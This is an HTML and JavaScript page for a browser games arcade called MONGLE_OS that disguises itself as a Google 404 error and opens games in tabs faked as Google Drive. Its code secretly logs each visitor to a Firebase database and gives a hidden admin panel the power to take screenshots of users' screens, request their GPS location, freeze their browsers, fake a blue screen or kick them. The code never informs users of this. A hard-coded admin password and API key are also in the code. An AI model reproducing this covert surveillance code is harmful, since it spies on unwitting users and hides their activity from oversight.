<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>404 Not Found</title>
    <link id="favicon" rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        /* --- CORE THEME --- */
        :root { 
            --primary: #0f0; --dim: #004400; --bg: #050505; --panel: #0a0a0a; 
            --border: #1a1a1a; --text: #e0e0e0; --accent: #00ff41; 
            --err: #ff3333; --warn: #ffcc00;
        }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #fff; color: #222; font-family: 'Segoe UI', sans-serif; overflow: hidden; user-select: none; }
        
        /* --- LOCKDOWN MASK (Google 404 Replica) --- */
        #lockdown { position: fixed; inset: 0; background: #fff; z-index: 10000; padding: 30px; display: flex; flex-direction: column; font-family: arial, sans-serif; }
        #lockdown h1 { font-weight: normal; margin: 0 0 10px; color: #222; font-size: 24px; }
        #lockdown p { font-size: 14px; color: #444; margin: 0; }
        #lockdown span { color: #777; font-size: 13px; margin-top: 10px; display: block; }
        
        /* Secret Click Areas */
        #ghostAdmin { position: fixed; top: 0; left: 0; width: 50px; height: 50px; z-index: 20000; cursor: default; }
        #ghostPleb { position: fixed; top: 0; right: 0; width: 50px; height: 50px; z-index: 20000; cursor: default; }

        /* --- OS INTERFACE --- */
        #app { display: none; height: 100vh; flex-direction: column; background: var(--bg); color: var(--text); font-family: 'Consolas', 'Courier New', monospace; }
        
        /* Navigation Bar */
        .nav { height: 50px; background: #000; border-bottom: 1px solid var(--dim); display: flex; align-items: center; padding: 0 20px; justify-content: space-between; }
        .logo { color: var(--primary); font-weight: bold; font-size: 16px; letter-spacing: 1px; }
        .logo span { color: #555; font-size: 10px; margin-left: 5px; }

        .search-bar { background: #111; border: 1px solid #333; color: var(--primary); padding: 5px 10px; width: 300px; font-family: inherit; font-size: 13px; outline: none; border-radius: 3px; transition: 0.2s; }
        .search-bar:focus { border-color: var(--primary); box-shadow: 0 0 10px rgba(0,255,0,0.1); }

        /* Game Grid */
        .game-grid { flex: 1; overflow-y: auto; padding: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
        .game-grid::-webkit-scrollbar { width: 8px; }
        .game-grid::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
        
        .card { background: var(--panel); border: 1px solid var(--border); height: 120px; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; position: relative; transition: all 0.2s ease; border-radius: 6px; }
        .card:hover { border-color: var(--primary); transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,255,0,0.1); background: #0e0e0e; }
        .card-title { font-size: 13px; color: #aaa; margin-top: 10px; font-weight: bold; letter-spacing: 0.5px; }
        .fav-btn { position: absolute; top: 8px; right: 8px; color: #333; font-size: 18px; transition: 0.2s; z-index: 5; }
        .fav-btn:hover { color: #666; }
        .fav-btn.active { color: var(--err); text-shadow: 0 0 8px var(--err); }

        /* --- MODALS & OVERLAYS --- */
        .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 5000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
        .modal { background: #000; border: 1px solid var(--dim); width: 90%; max-width: 1000px; padding: 20px; border-radius: 8px; box-shadow: 0 0 50px rgba(0,0,0,0.8); color: var(--text); position: relative; }
        
        .btn { background: #111; color: var(--primary); border: 1px solid var(--dim); padding: 8px 16px; cursor: pointer; font-family: inherit; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; transition: 0.2s; border-radius: 3px; }
        .btn:hover { background: var(--dim); color: #fff; border-color: var(--primary); }
        .btn-red { color: var(--err); border-color: #440000; }
        .btn-red:hover { background: #440000; color: #fff; border-color: var(--err); }
        
        /* Admin Panel Specifics */
        .admin-grid { display: grid; grid-template-columns: 250px 1fr; gap: 20px; height: 500px; }
        .user-list { border: 1px solid var(--border); background: #080808; overflow-y: auto; }
        .user-item { padding: 12px; border-bottom: 1px solid #1a1a1a; cursor: pointer; font-size: 12px; display: flex; justify-content: space-between; }
        .user-item:hover { background: #111; }
        .user-item.active { background: #002200; border-left: 3px solid var(--primary); color: #fff; }
        
        .monitor { background: #000; border: 1px solid var(--dim); height: 300px; margin-bottom: 15px; position: relative; background-size: contain; background-repeat: no-repeat; background-position: center; }
        .live-tag { position: absolute; top: 10px; right: 10px; background: #f00; color: #fff; font-size: 10px; padding: 2px 6px; border-radius: 3px; display: none; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }

        /* Effects */
        #bsod { display:none; position:fixed; inset:0; background:#0078d7; color:#fff; padding:10% 20%; font-family:"Segoe UI"; z-index:99999; cursor:none; }
        #freeze { display:none; position:fixed; inset:0; background:rgba(255,255,255,0.1); backdrop-filter:grayscale(100%); z-index:99999; cursor:wait; }
    </style>
</head>
<body>

    <div id="ghostAdmin" onclick="sys.door('admin')"></div>
    <div id="ghostPleb" onclick="sys.door('user')"></div>
    
    <div id="lockdown">
        <h1>404. <span style="color:#777; font-weight:normal;">That‚Äôs an error.</span></h1>
        <p>The requested URL was not found on this server. <span style="color:#777;">That‚Äôs all we know.</span></p>
    </div>

    <div id="authLayer" class="overlay">
        <div class="modal" style="max-width:350px; text-align:center;">
            <h2 style="color:var(--primary); margin-top:0;">MONGLE_OS v4.0</h2>
            <input type="text" id="username" class="search-bar" placeholder="IDENTITY_STRING..." style="width:100%; box-sizing:border-box; margin-bottom:15px; text-align:center;">
            <button class="btn" style="width:100%" onclick="sys.login()">INITIALIZE SESSION</button>
        </div>
    </div>

    <div id="app">
        <div class="nav">
            <div class="logo">MONGLE_OS <span id="idBadge">GUEST</span></div>
            <input type="text" id="search" class="search-bar" placeholder="SEARCH DATABASE..." oninput="ui.render()">
            <div style="display:flex; gap:10px;">
                <button id="admBtn" class="btn" style="display:none; color:var(--warn);" onclick="ui.toggle('adminPanel')">OVERSEER</button>
                <button class="btn" onclick="ui.toggle('settingsPanel')">CONFIG</button>
                <button class="btn btn-red" onclick="sys.panic()">PANIC</button>
            </div>
        </div>
        <div id="grid" class="game-grid"></div>
    </div>

    <div id="settingsPanel" class="overlay">
        <div class="modal" style="max-width:400px;">
            <h3 style="border-bottom:1px solid #333; padding-bottom:10px; margin-top:0;">SYSTEM CONFIGURATION</h3>
            
            <div style="margin-bottom:15px;">
                <label style="font-size:11px; color:#888;">PANIC TRIGGER (KEY)</label>
                <input type="text" id="cfgKey" class="search-bar" style="width:100%; text-align:center; cursor:pointer;" readonly value="ESCAPE">
            </div>

            <div style="margin-bottom:15px;">
                <label style="font-size:11px; color:#888;">PANIC DESTINATION (URL)</label>
                <input type="text" id="cfgUrl" class="search-bar" style="width:100%;" value="https://google.com">
            </div>

            <div style="margin-bottom:15px;">
                <label style="font-size:11px; color:#888;">STEALTH PROTOCOL</label>
                <select id="cfgMode" class="search-bar" style="width:100%;">
                    <option value="blob">BLOB CLOAK (Highest Security)</option>
                    <option value="tab">STANDARD TAB (Faster)</option>
                </select>
            </div>

            <button class="btn" style="width:100%; border-color:var(--primary);" onclick="sys.saveCfg()">APPLY CHANGES</button>
            <button class="btn btn-red" style="width:100%; margin-top:5px;" onclick="ui.toggle('settingsPanel')">CANCEL</button>
        </div>
    </div>

    <div id="adminPanel" class="overlay">
        <div class="modal">
            <div style="display:flex; justify-content:space-between; margin-bottom:15px; border-bottom:1px solid #333; padding-bottom:10px;">
                <h3 style="margin:0; color:var(--warn);">OVERSEER_CONTROL_DECK</h3>
                <button class="btn" onclick="ui.toggle('adminPanel')">CLOSE LINK</button>
            </div>
            
            <div class="admin-grid">
                <div id="userList" class="user-list"></div>
                
                <div style="display:flex; flex-direction:column;">
                    <div id="monitor" class="monitor">
                        <div class="live-tag" id="liveTag">‚óè LIVE FEED</div>
                    </div>
                    
                    <div id="intel" style="font-size:11px; color:#888; margin-bottom:10px; height:60px; overflow:hidden;">Waiting for target selection...</div>

                    <div style="display:grid; grid-template-columns: repeat(4, 1fr); gap:10px;">
                        <button class="btn" onclick="adm.act('capReq')">üì∏ SCREEN</button>
                        <button class="btn" id="watchBtn" style="color:var(--primary);" onclick="adm.watch()">üëÅÔ∏è WATCH</button>
                        <button class="btn" onclick="adm.act('reload')">‚Üª RELOAD</button>
                        <button class="btn" onclick="adm.act('gpsReq')">üìç GPS</button>
                        
                        <button class="btn btn-red" onclick="adm.act('frozen')">‚ùÑÔ∏è FREEZE</button>
                        <button class="btn btn-red" onclick="adm.act('bsod')">‚ò†Ô∏è BSOD</button>
                        <button class="btn btn-red" onclick="adm.act('kicked')">üö´ KICK</button>
                        <button class="btn btn-red" onclick="adm.nuke()">‚ò¢Ô∏è NUKE ALL</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="freeze"></div>
    <div id="bsod">:(<br><br>Your PC ran into a problem and needs to restart.<br><br>Stop Code: CRITICAL_PROCESS_DIED</div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, update, push, remove, onDisconnect } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // 1. CONFIG
        const DB_CONFIG = { apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" };
        const app = initializeApp(DB_CONFIG);
        const db = getDatabase(app);
        
        // 2. STATE
        let state = {
            user: null, id: null, isAdmin: false,
            games: [], favs: JSON.parse(localStorage.getItem('favs')||'[]'),
            cfg: {
                key: localStorage.getItem('mKey') || 'Escape',
                url: localStorage.getItem('mUrl') || 'https://google.com',
                mode: localStorage.getItem('mMode') || 'blob'
            },
            admin: { selected: null, watchTimer: null }
        };

        // 3. UI CONTROLLER
        window.ui = {
            toggle: (id) => { const el = document.getElementById(id); el.style.display = el.style.display==='flex'?'none':'flex'; },
            
            render: () => {
                const grid = document.getElementById('grid'); grid.innerHTML = '';
                const q = document.getElementById('search').value.toLowerCase();
                
                state.games.filter(g => g.name.toLowerCase().includes(q)).forEach(g => {
                    const el = document.createElement('div'); el.className = 'card';
                    const isFav = state.favs.includes(g.name);
                    el.innerHTML = `
                        <div class="fav-btn ${isFav?'active':''}" onclick="event.stopPropagation(); ui.fav('${g.name}')">‚ù§</div>
                        <div style="font-size:24px; color:var(--primary);">üëæ</div>
                        <div class="card-title">${g.name.replace('.html','').toUpperCase()}</div>
                    `;
                    el.onclick = () => sys.launch(g.name);
                    grid.appendChild(el);
                });
            },

            fav: (n) => {
                if(state.favs.includes(n)) state.favs = state.favs.filter(x=>x!==n);
                else state.favs.push(n);
                localStorage.setItem('favs', JSON.stringify(state.favs));
                ui.render();
            }
        };

        // 4. SYSTEM LOGIC
        window.sys = {
            door: (type) => {
                if(type==='admin') {
                    if(prompt('AUTH_TOKEN:') === 'BALLS_ARE_GOOD') { 
                        state.isAdmin = true; 
                        document.getElementById('admBtn').style.display='block';
                        document.getElementById('idBadge').innerText = '[OVERSEER]';
                        document.getElementById('idBadge').style.color = 'var(--warn)';
                        sys.login();
                    }
                } else {
                    document.getElementById('authLayer').style.display = 'flex';
                }
            },

            login: async () => {
                const name = document.getElementById('username').value || 'User_'+Math.floor(Math.random()*1000);
                document.getElementById('lockdown').style.display = 'none';
                document.getElementById('authLayer').style.display = 'none';
                document.getElementById('app').style.display = 'flex';

                // Register Presence
                const refLink = push(ref(db, 'presence'), {
                    name: name, activity: 'Idle', joined: Date.now(),
                    res: `${screen.width}x${screen.height}`,
                    ua: navigator.userAgent
                });
                state.id = refLink.key;
                onDisconnect(refLink).remove();

                // Listen for Commands
                onValue(ref(db, `presence/${state.id}`), s => {
                    const d = s.val(); if(!d) return;
                    if(d.kicked) window.location.href = state.cfg.url;
                    if(d.reload) window.location.reload();
                    
                    document.getElementById('freeze').style.display = d.frozen ? 'block' : 'none';
                    document.getElementById('bsod').style.display = d.bsod ? 'block' : 'none';
                    if(d.frozen || d.bsod) { if(state.win) state.win.close(); }

                    if(d.capReq) {
                        html2canvas(document.body).then(c => update(refLink, { lastCap: c.toDataURL('image/webp', 0.2), capReq: false }));
                    }
                    if(d.gpsReq) {
                        navigator.geolocation.getCurrentPosition(
                            p => update(refLink, { gps: `${p.coords.latitude},${p.coords.longitude}`, gpsReq: false }),
                            e => update(refLink, { gps: 'DENIED', gpsReq: false })
                        );
                    }
                });

                // Fetch Games
                const r = await fetch('https://api.github.com/repos/bob154526-hue/Mongle/contents/');
                const json = await r.json();
                state.games = json.filter(x => x.name.endsWith('.html') && x.name !== 'index.html');
                ui.render();

                if(state.isAdmin) adm.init();
            },

            launch: (game) => {
                const url = `https://raw.githack.com/bob154526-hue/Mongle/main/${game}`;
                update(ref(db, `presence/${state.id}`), { activity: 'Playing ' + game });

                // THE SPY SCRIPT: Injected into the Blob to allow remote monitoring
                const spy = `
                    <script type="module">
                        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
                        import { getDatabase, ref, onValue, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
                        import "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
                        
                        const db = getDatabase(initializeApp({ apiKey: "AIzaSyDgRvxKypPsOx379SNleE6Uij7mKkEJxGY", databaseURL: "https://monglearcade-default-rtdb.firebaseio.com", projectId: "monglearcade" }));
                        const myRef = ref(db, 'presence/${state.id}');
                        
                        onValue(myRef, (s) => {
                            const d = s.val();
                            if(d && d.capReq) {
                                // Capture the body. Note: Cannot capture cross-origin iframe content due to browser security.
                                // It will capture the UI around it.
                                html2canvas(document.body).then(c => {
                                    update(myRef, { lastCap: c.toDataURL('image/webp', 0.2), capReq: false });
                                });
                            }
                            if(d && (d.kicked || d.bsod || d.frozen)) { window.close(); }
                        });
                    <\/script>
                `;

                if(state.cfg.mode === 'blob') {
                    const html = `
                        <!DOCTYPE html>
                        <html><head>
                        <title>My Drive - Google Drive</title>
                        <link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_32dp.png">
                        <style>body,html{margin:0;padding:0;height:100vh;overflow:hidden;background:#000;}iframe{width:100%;height:100%;border:none;}</style>
                        </head><body>
                        <iframe src="${url}" allowfullscreen></iframe>
                        ${spy}
                        </body></html>
                    `;
                    const blob = new Blob([html], {type:'text/html'});
                    state.win = window.open(URL.createObjectURL(blob), '_blank');
                } else {
                    state.win = window.open(url, '_blank');
                }
            },

            panic: () => {
                if(state.win) state.win.close();
                window.location.replace(state.cfg.url);
            },

            saveCfg: () => {
                state.cfg.url = document.getElementById('cfgUrl').value;
                state.cfg.mode = document.getElementById('cfgMode').value;
                localStorage.setItem('mUrl', state.cfg.url);
                localStorage.setItem('mMode', state.cfg.mode);
                localStorage.setItem('mKey', state.cfg.key);
                alert('CONFIG SAVED');
                ui.toggle('settingsPanel');
            }
        };

        // 5. ADMIN CONTROLLER
        window.adm = {
            init: () => {
                onValue(ref(db, 'presence'), s => {
                    const list = document.getElementById('userList'); list.innerHTML = '';
                    s.forEach(u => {
                        const val = u.val();
                        const d = document.createElement('div');
                        d.className = `user-item ${state.admin.selected === u.key ? 'active' : ''}`;
                        let icon = 'üü¢';
                        if(val.frozen) icon = '‚ùÑÔ∏è'; if(val.bsod) icon = '‚ò†Ô∏è';
                        
                        d.innerHTML = `<span>${icon} ${val.name}</span><span style="color:#666">${val.activity.substring(0,15)}</span>`;
                        d.onclick = () => adm.select(u.key, val);
                        list.appendChild(d);
                        
                        // Live Update Preview if selected
                        if(state.admin.selected === u.key && val.lastCap) {
                            document.getElementById('monitor').style.backgroundImage = `url(${val.lastCap})`;
                        }
                    });
                });
            },
            
            select: (key, val) => {
                state.admin.selected = key;
                document.getElementById('intel').innerHTML = `
                    <b>TARGET:</b> ${val.name} <br>
                    <b>RES:</b> ${val.res} | <b>GPS:</b> ${val.gps||'N/A'} <br>
                    <b>STATUS:</b> ${val.activity}
                `;
                adm.init(); // Re-render to highlight
            },

            act: (action) => {
                if(!state.admin.selected) return;
                onValue(ref(db, `presence/${state.admin.selected}/${action}`), s => {
                    update(ref(db, `presence/${state.admin.selected}`), { [action]: !s.val() });
                }, {onlyOnce:true});
            },

            watch: () => {
                const btn = document.getElementById('watchBtn');
                const tag = document.getElementById('liveTag');
                if(state.admin.watchTimer) {
                    clearInterval(state.admin.watchTimer); state.admin.watchTimer = null;
                    btn.innerText = 'üëÅÔ∏è WATCH'; tag.style.display = 'none';
                } else {
                    if(!state.admin.selected) return;
                    btn.innerText = '‚èπ STOP'; tag.style.display = 'block';
                    state.admin.watchTimer = setInterval(() => {
                        update(ref(db, `presence/${state.admin.selected}`), { capReq: true });
                    }, 1500);
                }
            },
            
            nuke: () => {
                if(confirm('NUKE ALL CONNECTIONS?')) {
                    onValue(ref(db, 'presence'), s => s.forEach(u => update(ref(db,`presence/${u.key}`),{reload:true})), {onlyOnce:true});
                }
            }
        };

        // 6. GLOBAL LISTENERS
        // Key Binding Logic
        const keyInp = document.getElementById('cfgKey');
        keyInp.onclick = () => {
            keyInp.value = '[ PRESS KEY ]';
            keyInp.style.color = 'var(--primary)';
            const h = (e) => { e.preventDefault(); state.cfg.key = e.key; keyInp.value = e.key.toUpperCase(); window.removeEventListener('keydown', h); };
            window.addEventListener('keydown', h);
        };

        // The Panic Listener (Priority 1)
        window.addEventListener('keydown', (e) => {
            if(e.key === state.cfg.key) {
                e.stopImmediatePropagation();
                e.preventDefault();
                sys.panic();
            }
        }, true);
    </script>
</body>
</html>
